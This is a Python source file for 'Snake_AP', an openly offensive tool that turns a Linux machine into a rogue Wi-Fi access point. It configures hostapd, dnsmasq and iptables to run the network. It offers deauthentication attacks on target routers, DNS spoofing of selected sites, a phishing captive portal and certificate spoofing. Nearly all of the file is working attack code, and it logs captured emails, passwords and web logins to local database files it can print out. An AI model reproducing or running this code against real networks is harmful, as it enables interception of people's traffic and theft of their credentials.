#!/usr/bin/env python3
# sudo apt-get install dbus-x11 
import re
import os 
import sys
import time
import shutil
import argparse
import subprocess
from subprocess import PIPE
from Snake_Package.banner import *
from Snake_Package.Deauth_wifi import Deauth_Router
R='\033[31m'
W='\033[0m'

print(Banner2)
if os.geteuid() != 0 :
    print("\n[+] Run as root or sudo ")
    exit()
else:
    pass
os.system("sudo fuser -k 53/udp >/dev/null 2>&1 ")

Curent_dir  = os.path.abspath(os.getcwd())
user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
resources1 =str(os.path.dirname(__file__))+'/Snake_Package/resources/apache2.conf.txt'
resources2= str(os.path.dirname(__file__))+'/Snake_Package/CopyConfig.sh'

def Check_Packages(): 
     list_Pakages = [
                     "  which dnsmasq           > /dev/unll 2>&1 ",
                     "  which apache2           > /dev/unll 2>&1 ",
                     "  which hostapd           > /dev/unll 2>&1 ",
                     "  which aircrack-ng       > /dev/unll 2>&1 ",
                     "  which gnome-terminal    > /dev/unll 2>&1 ",

                    ]       
     for package in list_Pakages :
              test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
              if test_packages == 0  :                     
                 continue
              else:  
                  for package in list_Pakages :
                      test_packages = subprocess.call(  package ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)  
                      if test_packages != 0  : 
                         if   'hostapd ' in package :
                            package ='hostapd'
                         elif 'apache2' in package :
                             package =  'apache2' 
                         elif "dnsmasq" in package :
                             package = 'dnsmasq'   
                         elif 'aircrack-ng' in package :
                             package = 'aircrack-ng' 
                         elif "gnome-terminal" in package :
                             package = 'gnome-terminal'
                         print ("[!] Error Package Not Found " ,package)
                  os.system("sudo killall dnsmasq >/dev/null 2>&1")       
                  exit()   
Check_Packages()


def BackUp_apache2(Path1,Path2):
    if os.path.exists('/etc/apache2/apache2.conf.bck'):
        pass
    else:  
        os.chmod(Path2, 0o755)
        subprocess.run(
        ["/bin/bash", "--noprofile", "--norc" ,Path2 ],
        check=True
        )
        print('[*] Apache2 Configuration Backup and Migration completed successfully.')
        with open (Path1,'r') as addConfig:
            addConfig = addConfig.read()
        with open('/etc/apache2/apache2.conf' ,'w') as CaptivePortalConfig:
            CaptivePortalConfig = CaptivePortalConfig.write(addConfig)
   

def RESet(Path):
    os.chmod(Path, 0o755)
    subprocess.run(

        ["/bin/bash", "--noprofile", "--norc" ,Path ],
        check=True
       )
    print("[*] Reset all Apache2 configurations, clear cache, and remove all Snake_AP setups ")

class Fake_access_point:
     
      def __init__(self):
          self.args_Control()  
          if self.args.List and not self.args.Interface:
             # Check if the correct number of arguments is provided
                if len(sys.argv) == 2 :
                    all_interfaces = os.listdir('/sys/class/net/')
                    print("[+] List of Available Devices\n" + "=" * 25)
                    for interface in all_interfaces:
                        print("[+] Interface:", interface)
                    exit()    
                else:
                    print("[*] Error: The -L/--List option should be used without additional arguments.")
                    print("[+] Usage: sudo ./snake_ap.py -L")
                    exit(1)

          if self.args.Show and not self.args.Interface:
            self.Show_ap_all()
          if 'None' in str(self.args.Interface) and not self.args.reset and not self.args.webdata:
             print("usage: snake_ap.py [-h] [-I  ] [-S ] [-AP ] [-D  ] [-CP] [-L]")
             print("snake_ap.py: error: argument -I  /--Interface: required ")
             exit()
                               
          if self.args.Interface :
              all_Interface = os.listdir('/sys/class/net/') 
              if (self.args.Interface in all_Interface) or (str(self.args.Interface)+'mon' in all_Interface) :
                 print("[+] ChecK Paskages ....Done !! ")              
              else:
                 print(f"[+] Interface failed : {R}{self.args.Interface}{W} is not currently connected or does not exist")
                 exit()  
          if self.args.reset:
            if  len(sys.argv)==2 :
                RESet(str(os.path.dirname(__file__))+'/Snake_Package/ReSet.sh')
                exit()
            else:    
               print("[*] error : argumet --reset ")
               print("[+] use the option with out argumet < sudo ./snake_ap.py --reset > ")                          
               exit() 
          if self.args.webdata :
            if  len(sys.argv)==2 :
                try:
                    with open('.WEB_AUTH_db.txt','r') as webcach:
                        print(webcach.read())
                        exit()
                except Exception:
                   print("[+] Error : DataBaes not  Found file not Exists Error")  
                   exit()  
            else:
                print("[*] error : argumet --webdata ")
                print("[+] use the option with out argumet < sudo ./snake_ap.py --webdata > ")                          
                exit()       
                  
          if self.args.Deauth :
             Mac_Format = re.compile(r'(?:[0-9a-fA-F]:?){12}')
             Mac_found = re.findall(Mac_Format , self.args.Deauth  )
             if self.args.Deauth  in Mac_found:
                pass
             else:
                 print("\n"+"[+] Invalid Mac address")
                 print("[+] Invalid literal for int() with base 16")
                 print("[+] Mac format = xx:xx:xx:xx:xx:xx")
                 exit() 
             command = "sudo iw dev " +self.args.Interface+" interface add wlansnake type station > /dev/null 2>&1"
             os.system(command ) #sudo iw dev Sanke1 del 

             print("\n[+] Snake_AP add 'wlansnake'  as Virtual Interfaces ......!! ")
          if self.args.dns or self.args.Portal:
            file  = os.listdir('/etc/apache2')
            if 'ports.bck' in file: 
                pass
            else :    
                BackUp_apache2(resources1,resources2)     
          else:
                pass       
          self.Clean_IP_Table()         
          self.Create_File_hostapd()     
          self.Create_dns_masq()        
          self.Start_InterFace()
          self.Create_Fake() 
          self.Set_IPTable_Config()
          self.call_tremmial()
          
      def Show_ap_all(self):
          try:
             if self.args.Show and (len(sys.argv)==2):
                from Snake_Package.Show_AP import  Show_AP_all
                run = Show_AP_all()
                exit() 
             elif self.args.Show and (len(sys.argv)!=2):
                  print("[*] error : argumet -S/--Show ")
                  print("[+] use the option with out argumet < sudo ./snake_ap.py -S > ")
                  exit()
          except KeyboardInterrupt :
                 exit() 
      def Clean_IP_Table(self):
          Table_Flush = [
                            "sudo service NetworkManager start ",
                            "sudo iptables -D FORWARD --in-interface "+f'{self.args.Interface}'+"mon"+" -j ACCEPT"
                       ]
          for _ in Table_Flush :
              call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
              time.sleep(0.30)      
      def Create_Fake (self):
          try: 
              ifconfig_command  = [   
                                      
                               "sudo airmon-ng start "+f'{self.args.Interface}'
                              ]                
              for _ in  ifconfig_command :
                  call_termminal = subprocess.call(ifconfig_command ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
                  time.sleep(2)
              print("[+] Interface is in monitor Mode")
          except KeyboardInterrupt: 
              exit()
      def Create_File_hostapd(self):
          try:
              if os.path.exists(Curent_dir+"/Snake_config/") :
                 pass
              else:                 
                   os.mkdir(Curent_dir+"/Snake_config/") 
                   group  = "chown "+ user_name+ ":"+user_name +" *" 
                   os.system(group)             
                   print("[+] Sanke_AP Configrution hostapd and dnsmasq  is create " )                   
                   with open ('/etc/hostapd/hostapd.conf','w') as pathconfig :
                       pathconfig.write("DAEMON_CONF="+Curent_dir+"/Snake_config/hostapd.conf")               
              os.chdir(os.path.dirname(__file__)+"/Snake_config/")              
              with open("./hostapd.conf",'w') as config_hostapd :
                    if self.args.APName :
                       ssid_AP = self.args.APName
                    else:
                        ssid_AP = 'Free-Wifi'
                    config_hostapd.write(
                                          'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                          "driver=nl80211"+'\n'\
                                          "ssid="+ssid_AP+'\n'\
                                          "hw_mode=g"+'\n'\
                                          "channel=11"+'\n'\
                                          "macaddr_acl=0"+'\n'\
                                          "ignore_broadcast_ssid=0"+"\n"
                                         )  
              group  = "chown "+ user_name+ ":"+user_name +" ./hostapd.conf" 
              os.system(group)   
          except KeyboardInterrupt:
                 exit()        
      def Create_dns_masq(self):
          try:
              with open("./dnsmasq.conf",'w') as dnsmasq:
                  if self.args.dns and not self.args.Portal :                    
                      dnsmasq.write(
                                   'no-resolv'+'\n'\
                                   'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                   "dhcp-range=172.160.255.50,172.160.255.62,255.255.255.240, 12h"+'\n'\
                                   "dhcp-option=3,172.160.255.49"+'\n'\
                                   "dhcp-option=6,172.160.255.49"+'\n'\
                                   "server=208.67.220.220"+'\n'\
                                   "log-queries"+'\n'\
                                   "log-dhcp"+"\n"\
                                   "bogus-priv"+'\n'\
                                   "listen-address= 127.0.0.1"+'\n'
                                )  
                  elif self.args.Portal and not self.args.dns:
                      dnsmasq.write(
                                   'no-resolv'+'\n'\
                                   'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                   "dhcp-range=172.170.250.50,172.170.250.62,255.255.255.240, 12h"+'\n'\
                                   "dhcp-option=3,172.170.250.49"+'\n'\
                                   "dhcp-option=6,172.170.250.49"+'\n'\
                                   "server=208.67.220.220"+'\n'\
                                   "log-queries"+'\n'\
                                   "log-dhcp"+"\n"\
                                   "bogus-priv"+'\n'\
                                   "listen-address= 127.0.0.1"+'\n'
                                   "address=/#/172.170.250.49"+"\n"  
                                   ) 
                  else:
                      dnsmasq.write(
                                   'no-hosts'+'\n'\
                                   'interface='+f'{self.args.Interface}'+'mon'+'\n'\
                                   "dhcp-range=172.100.240.50,172.100.240.62,255.255.255.240, 12h"+'\n'\
                                   "dhcp-option=3,172.100.240.49"+'\n'\
                                   "dhcp-option=6,172.100.240.49"+'\n'\
                                   "server=208.67.220.220"+'\n'\
                                   "log-queries"+'\n'\
                                   "log-dhcp"+"\n"\
                                   "bogus-priv"+'\n'\
                                   "listen-address= 127.0.0.1"+'\n'
                                  )     
              if self.args.dns:
                    add_hosts= "no-resolv"+'\n'+'no-hosts'+'\n'+"addn-hosts="+Curent_dir+"/Snake_Package/resources/hosts.txt"+'\n'+"address=/loc/172.160.255.49"
                    with open ("./dnsmasq.conf",'r') as read_config:
                         config_dn = read_config.read().replace('no-resolv',add_hosts).replace("listen-address= 127.0.0.1" ,'listen-address= 127.0.0.1 , 172.160.255.49')
                    with open ("./dnsmasq.conf",'w') as write_config:
                         write_config.write(config_dn)
              group  = "chown "+ user_name+ ":"+user_name +" "+"dnsmasq.conf" 
              os.system(group) 
          except KeyboardInterrupt:
                exit() 
      def Start_InterFace(self):
          try:
            
             all_Interface = os.listdir('/sys/class/net/') 
             if self.args.Interface in all_Interface :
                 all_Interface.remove(self.args.Interface)
             count = 0
             for self.interface in all_Interface  :
                 try:   
                    
                     command = 'ping -I '+f'{self.interface}'+' -w1 www.google.com  >/dev/null 2>&1 '  
                     communicate = os.system(command)
                     count +=1
                     if communicate  == 0 :
                        print("[+] Snake_AP Sharing internet with Interface [" +f'{self.interface}'+" ]")
                        break
                     else:
                         if  communicate == 512 and count == len( all_Interface):
                             print("[+] No Interface have Internet to Share Connection")
                             exit()
                 except Exception  :
                        continue   
          except KeyboardInterrupt:
                exit()                
      def Set_IPTable_Config(self):
              try: 
                  if self.args.dns:                   
                      Set_Up_access_point = [
                                  "iptables -t nat -F",
                                  "iptables -t nat -X",
                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 172.160.255.49 netmask 255.255.255.240",
                                  "route add -net 172.160.255.48 netmask 255.255.255.240 gw\
                                  172.160.255.49",
                                  "iptables --flush",
                                  "iptables --table nat --append POSTROUTING\
                                   --out-interface "+ f'{self.interface}'+" -j MASQUERADE",
                                  "iptables --append FORWARD --in-interface "+f'{self.args.Interface}'+"mon\
                                   -j ACCEPT",
                                  "iptables -t nat -A POSTROUTING -j MASQUERADE",
                                  "echo 1 > /proc/sys/net/ipv4/ip_forward",
                                ]
                  elif self.args.Portal:
                      Set_Up_access_point = [
                                  "iptables -t nat -F",
                                  "iptables -t nat -X",
                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 172.170.250.49 netmask 255.255.255.240",
                                  "route add -net 172.170.250.48 netmask 255.255.255.240 gw\
                                  172.170.250.49",
                                  "iptables --flush",
                                  "iptables --table nat --append POSTROUTING\
                                   --out-interface "+ f'{self.interface}'+" -j MASQUERADE",
                                  "iptables --append FORWARD --in-interface "+f'{self.args.Interface}'+"mon\
                                   -j ACCEPT",
                                  "iptables -t nat -A POSTROUTING -j MASQUERADE",
                                  "echo 1 > /proc/sys/net/ipv4/ip_forward",
                                ]  
                  else:
                      Set_Up_access_point = [
                                  "iptables -t nat -F",
                                  "iptables -t nat -X",
                                  "ifconfig "+f'{self.args.Interface}'+'mon'+" up 172.100.240.49 netmask 255.255.255.240",
                                  "route add -net 172.100.240.48 netmask 255.255.255.240 gw\
                                  172.100.240.49",
                                  "iptables --flush",
                                  "iptables --table nat --append POSTROUTING\
                                   --out-interface "+ f'{self.interface}'+" -j MASQUERADE",
                                  "iptables --append FORWARD --in-interface "+f'{self.args.Interface}'+"mon\
                                   -j ACCEPT",
                                  "iptables -t nat -A POSTROUTING -j MASQUERADE",
                                  "echo 1 > /proc/sys/net/ipv4/ip_forward",  
                                ]                         
                  for _ in Set_Up_access_point :
                      call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
                  with open(Curent_dir+"/Snake_Package/resources/port_def.txt",'r') as port:
                       port_80 = port.read()
                  with open("/etc/apache2/ports.conf",'w') as portset:
                       portset.write(port_80)     
              except KeyboardInterrupt:
                     exit()
      def call_tremmial(self):
          def Set_Log(): 
                   
              subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"],shell=True)
              subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/read_errorLOG.py"],shell=True)
              command_run = Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"
              command_proc3 = ' gnome-terminal --geometry 110x30+1000+60  -e ' +'"' + command_run +'"'               
              call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
              if os.path.exists(Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt") :
                  group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt" 
                  os.system(group)
              with open(Curent_dir+'/Email_Password.db','a') as DB_PASS :
                    group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
                    os.system(group1)
          try: 
              def WifiAP():
                  subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
                  order = Curent_dir+"/Snake_Package/Host_apd.py"             
                  command_proc = ' gnome-terminal --geometry 95x30+100+10 -e ' +'"' + order  +'"'                  
                  call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
         
                  order2 = "dnsmasq -C dnsmasq.conf -d"
                  command_proc2 = ' gnome-terminal --geometry 95x30+100+5000  -e ' +'"' + order2 +'"'         
                  call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)

              if self.args.dns and not self.args.Deauth\
              and  not self.args.Portal :
                 from Snake_Package.dns_spoofing import DNS_Spoofing
                 run = DNS_Spoofing()
                 WifiAP()
              elif self.args.Deauth\
              and not self.args.dns and not self.args.Portal :                                
                  run = Deauth_Router()  
                  WifiAP()
              elif self.args.Deauth and self.args.dns\
              and not self.args.Portal :
                    from Snake_Package.dns_spoofing import DNS_Spoofing
                    run = Deauth_Router()  
                    run = DNS_Spoofing() 
                    WifiAP() 
              elif self.args.Portal\
              and not self.args.dns and not self.args.Deauth:
                 from Snake_Package.Captive_Portal import Captive_Portal
                 try:
                    shutil.copytree(Curent_dir+'/Captive_Portal/', '/var/www/Captive_Portal')
                 except FileExistsError :
                      time.sleep(.0001)
                 run = Captive_Portal()  
                 Set_Log()
                 WifiAP()
              else:
                   if not self.args.dns and not self.args.Deauth\
                   and not self.args.Portal:
                      print("[+] access point start ")
                      WifiAP()
                      exit()
          except KeyboardInterrupt :
                  Command  = [
                               "sudo airmon-ng stop wlan0mon",
                               " sudo service NetworkManager restart",
                            ]
                  for _ in Command : 
                     subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
   
                  print("[*] FAKE ACCESS POINT EXIT ...!!")
                  time.sleep(1)
                  exit() 
      def args_Control(self):
            parser = argparse.ArgumentParser(description="Usage: <Option> <Arguments>")
            parser = argparse.ArgumentParser(description="Usage: <Option> <Arguments>")
            parser.add_argument('-S', "--Show", action='store_true', help="Display all nearby access points with details such as BSSID, SSID, channel, and signal strength.")
            parser.add_argument('-I', "--Interface", action=None, required=False, help="Specify the network interface to act as an access point (must support AP mode).")
            parser.add_argument('-AP', "--APName", action=None, help="Set the name of the access point (default is 'Free-wifi' if not specified).")
            parser.add_argument('-D', "--Deauth", action=None, help="Send deauthentication packets to a target WiFi network using 'aireplay-ng'.")
            parser.add_argument('-CP', "--Portal", action='store_true', help="Enable a captive portal for WiFi login pages.")
            parser.add_argument('-L', "--List", action='store_true', help="Check the availability of access points.")
            parser.add_argument('-T', "--Target", action=None, help="Specify the MAC address of the target device to send deauthentication packets.")
            parser.add_argument('-P', "--Packet", action=None, type=int, help="Set the number of deauthentication packets to send.")
            parser.add_argument('-cert', action='store_true', help="Renew SSL certificates.")
            parser.add_argument('--dns', action='store_true', help="Enable DNS spoofing for selected websites.")
            parser.add_argument('--cert', action='store_true', help="Renew SSL certificates spoofing for specified websites.")
            parser.add_argument('--reset', action='store_true', help="Reset all Apache2 configurations, clear cache, and remove all Snake_AP setups.")
            parser.add_argument('-W','--webdata', action='store_true', help="print credentol cated from websites.")
                        
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                
if __name__=='__main__':
    Fake_access_point()
